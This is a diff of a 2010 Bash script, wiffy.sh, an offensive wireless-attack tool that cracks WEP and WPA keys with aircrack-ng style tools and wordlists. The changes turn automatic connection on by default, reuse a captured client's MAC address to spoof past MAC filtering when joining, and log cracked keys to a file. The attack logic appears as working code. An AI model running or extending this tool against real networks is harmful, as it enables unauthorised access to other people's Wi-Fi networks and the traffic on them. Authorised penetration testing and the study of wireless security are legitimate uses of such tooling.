@@ -1,6 +1,6 @@
 #!/bin/bash
 #----------------------------------------------------------------------------------------------#
-#wiffy.sh v0.1 (#23 2010-10-08)                                                                #
+#wiffy.sh v0.1 (#24 2010-10-10)                                                                #
 # (C)opyright 2010 - g0tmi1k                                                                   #
 #---License------------------------------------------------------------------------------------#
 #  This program is free software: you can redistribute it and/or modify it under the terms     #
@@ -31,7 +31,7 @@ fakeMac="00:05:7c:9a:58:3f"
 wordlist="/pentest/passwords/wordlists/wpa.txt"
 
 # [true/false] Connect to network afterwords
-connect="false"
+connect="true"
 
 # [true/false] Keep captured cap's. [/path/to/folder/] Where to store the CAP
 keepCAP="true"
@@ -46,7 +46,7 @@ benchmark="true"
          timeWEP="15"             # How long to wait for WEP attacks (e.g. 15 Seconds)
          timeWPA="8"              # How long to wait for WPA attacks (e.g. 10 Seconds ~ 0=Forever!)
      diagnostics="false"          # Creates a output file displays exactly whats going on
-         verbose="0"              # Shows more info. 0=normal, 1=more , 2=more+commands
+         verbose="0"              # Shows more info. 0=normal, 1=more, 2=more+commands
            bssid=""               # null the value
            essid=""               # null the value
          channel=""               # null the value
@@ -54,8 +54,8 @@ benchmark="true"
      displayMore="false"          # Gives more details on whats happening
            debug="false"          # Windows don't close, shows extra stuff
          logFile="wiffy.log"      # Filename of output
-             svn="27"             # SVN Number
-         version="0.1 (#23)"      # Program version
+             svn="28"             # SVN Number
+         version="0.1 (#24)"      # Program version
 trap 'interrupt break' 2          # Captures interrupt signal (Ctrl + C)
 
 #----Functions---------------------------------------------------------------------------------#
@@ -303,19 +303,19 @@ function cleanUp() { #cleanUp #mode
       exit 0
    fi
 }
-function connect() { #connect $essid $key
+function connect() { #connect $essid $key #$key
    if [ "$debug" == "true" ] ; then display diag "connect~$@" ; fi
    error="free"
    if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Coding error
    if [ "$error" == "free" ] ; then
-      if [ "$client" != "$mac" ] && [ "$client" ] ; then
-         if [ "$displayMore" == "true" ] ; then display action "Attack (Spoofing): $client ('Helps' with MAC filtering) " ; fi
-         action "Spoofing MAC" "ifconfig $interface down && macchanger -m $client $interface && ifconfig $interface up"
+      if [ "$3" != "$mac" ] && [ "$3" ] ; then
+         if [ "$displayMore" == "true" ] ; then display action "Attack (Spoofing): $3 ('Helps' with MAC filtering) " ; fi
+         action "Spoofing MAC" "ifconfig $interface down ; macchanger -m $3 $interface ; ifconfig $interface up"
       fi
       display action "Joining: $1"
       action "Starting services" "/etc/init.d/wicd start ; service network-manager start" # Backtrack & Ubuntu
       if [ "$encryption" == "WEP" ] ; then
-         action "i[f/w]config" "ifconfig $interface down && iwconfig $interface essid $1 key $2 && ifconfig $interface up"
+         action "i[f/w]config" "ifconfig $interface down ; iwconfig $interface essid $1 key $2 ; ifconfig $interface up"
       elif [[ "$encryption" == *WPA* ]] ; then
          action "WPA" "wpa_passphrase $1 '$2' > /tmp/wiffy.tmp && wpa_supplicant -B -i$interface -c/tmp/wiffy.tmp -Dwext"
          cp -f "/tmp/wiffy.tmp" "wpa.conf"
@@ -581,7 +581,7 @@ function moveCap() { #moveCap $essid
    if [ "$error" == "free" ] ; then
       command=""
       if [ "$keepCAP" == "true" ] && [[ "$encryption" == *WPA* ]] ; then
-         if [ ! -e "$pathCAP" ] ; then command="mkdir $pathCAP ; " ; fi
+         if [ ! -e "$pathCAP" ] ; then command="mkdir $outputCAP ;" ; fi
          pathCAP="$outputCAP/$1.cap"
       else pathCAP="/tmp/wiffy-$1.cap" ; fi
       display action "Moving handshake: $pathCAP"
@@ -601,13 +601,18 @@ function testAP() { #testAP $essid $bssid $encryption
 
    if [ "$error" == "free" ] ; then
       if [ -e "wiffy.keys" ] ; then
-         tmp=$(cat wiffy.keys | sed -n "/ESSID: $1/, +3p")
-         key=$(echo $tmp | grep "BSSID: $2" -q  && echo $tmp | grep "Encryption: $3" -q && echo $tmp | sed -n 's/.*Key: //p')
-         if [ "$key" ] ; then  display info "$essid's key *may* be: $key"
-            read -p "[~] Try and connect with it? [Y/n]: "
-            if [[ "$REPLY" =~ ^[Nn]$ ]] ; then return 1
-            else connect "$essid" "$key" ; fi
-            if [ "$stage" == "connected" ] ; then cleanUp clean ; fi
+         tmp=$(cat wiffy.keys | sed -n "/ESSID: $1/, +4p")
+         key=$(echo $tmp | grep "BSSID: $2" -q  && echo $tmp | grep "Encryption: $3" -q && echo $tmp | sed -n 's/.*Key: //p' | sed -n 's/Client: .*//p')
+         if [ "$key" ] ; then 
+            display info "$essid's key *may* be: $key"
+            #read -p "[~] Try and connect with it? [Y/n]: "
+            #if [[ "$REPLY" =~ ^[Nn]$ ]] ; then return 1
+            #else connect "$essid" "$key" ; fi
+            if [ "$connect" == "true" ] ; then 
+               client=$(echo $tmp | grep "BSSID: $2" -q  && echo $tmp | grep "Encryption: $3" -q && echo $tmp | sed -n 's/.*Key: //p')
+               connect "$essid" "$key" "$client"
+               if [ "$stage" == "connected" ] ; then cleanUp clean ; fi
+            fi
          fi
       fi
       return 0
@@ -709,8 +714,8 @@ if [ "$verbose" != "0" ] && [ "$verbose" != "1" ] && [ "$verbose" != "2" ] ; the
 if [ "$debug" != "true" ] && [ "$debug" != "false" ] ; then display error "debug ($debug) isn't correct" 1>&2 ; debug="true" ; fi # Something up... Find out what!
 if [ "$diagnostics" != "true" ] && [ "$diagnostics" != "false" ] ; then display error "diagnostics ($diagnostics) isn't correct" 1>&2 ; diagnostics="false" ; fi
 if [ "$diagnostics" == "true" ] && [ -z "$logFile" ] ; then display error "logFile ($logFile) isn't correct" 1>&2 ; logFile="wiffy.log" ; fi
-if [ -z "$timeScan" ] || [ "$timeScan" -lt "0" ]  ; then display error "timeScan ($timeScan) isn't correct" 1>&2 ; timeScan="10" ; fi
-if [ -z "$timeWEP" ] || [ "$timeWEP" -lt "0" ]  ; then display error "timeWEP ($timeWEP) isn't correct" 1>&2 ; timeWEP="15" ; fi
+if [ -z "$timeScan" ] || [ "$timeScan" -lt "1" ]  ; then display error "timeScan ($timeScan) isn't correct" 1>&2 ; timeScan="10" ; fi
+if [ -z "$timeWEP" ] || [ "$timeWEP" -lt "1" ]  ; then display error "timeWEP ($timeWEP) isn't correct" 1>&2 ; timeWEP="15" ; fi
 if [ -z "$timeWPA" ] || [ "$timeWPA" -lt "0" ]  ; then display error "timeWPA ($timeWPA) isn't correct" 1>&2 ; timeWPA="8" ; fi
 
 #for item in "foo" "bar" ; do
@@ -739,7 +744,7 @@ action "Killing programs" "killall wicd-client airodump-ng xterm wpa_action wpa_
 action "Killing services" "/etc/init.d/wicd stop ; service network-manager stop" # Backtrack & Ubuntu
 
 #----------------------------------------------------------------------------------------------#
-action "Refreshing interface" "ifconfig $interface down && ifconfig $interface up && sleep 1"
+action "Refreshing interface" "ifconfig $interface down ; ifconfig $interface up ; sleep 1"
 
 #----------------------------------------------------------------------------------------------#
 if [ -e "/sys/class/net/$interface/device/driver" ] ; then wifiDriver=$(ls -l "/sys/class/net/$interface/device/driver" | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/') ; fi
@@ -864,9 +869,9 @@ fi
 #----------------------------------------------------------------------------------------------#
 if [ "$macMode" != "false" ] ; then
    if [ "$displayMore" == "true" ] ; then display action "Configuring: MAC address" ; fi
-   command="ifconfig $monitorInterface down &&"
-   if [ "$macMode" == "random" ] ; then command="$command macchanger -A $monitorInterface &&"
-   elif [ "$macMode" == "set" ] ; then command="$command macchanger -m $fakeMac $monitorInterface &&" ; fi
+   command="ifconfig $monitorInterface down ;"
+   if [ "$macMode" == "random" ] ; then command="$command macchanger -A $monitorInterface ;"
+   elif [ "$macMode" == "set" ] ; then command="$command macchanger -m $fakeMac $monitorInterface ;" ; fi
    command="$command ifconfig $monitorInterface up"
    action "Configuring MAC" "$command"
    command=$(macchanger --show $monitorInterface)
@@ -912,7 +917,7 @@ if [ "$mode" == "crack" ] ; then
    action "Closing programs" "killall xterm ; airmon-ng stop $monitorInterface ; sleep 2" # Sleep = Make sure aircrack-ng has saved file.
 
    #----------------------------------------------------------------------------------------------#
-   if [ -e "/tmp/wiffy.keys" ] ; then key=$(cat "/tmp/wiffy.keys") ;  display info "WiFi key: $key" ;  echo -e "---------------------------------------\n      Date: $(date)\n     ESSID: $essid\n     BSSID: $bssid\nEncryption: $encryption\n       Key: $key\n    Client: $client" >> "wiffy.keys" ; if [ "$connect" == "true" ] ; then connect "$essid" "$key" ; fi
+   if [ -e "/tmp/wiffy.keys" ] ; then key=$(cat "/tmp/wiffy.keys") ;  display info "WiFi key: $key" ;  echo -e "---------------------------------------\n      Date: $(date)\n     ESSID: $essid\n     BSSID: $bssid\nEncryption: $encryption\n       Key: $key\n    Client: $client" >> "wiffy.keys" ; if [ "$connect" == "true" ] ; then connect "$essid" "$key" "$client"; fi
    elif [[ "$encryption" == *WPA* ]] && [ -e "$wordlist" ] ; then display error "WPA: WiFi key isn't in the wordlist" 1>&2
    elif [ "$encryption" == "WEP" ] ; then display error "WEP: Couldn't inject" 1>&2
    elif [ "$encryption" != "N/A" ] ; then display error "Something went wrong )=" 1>&2 ; fi
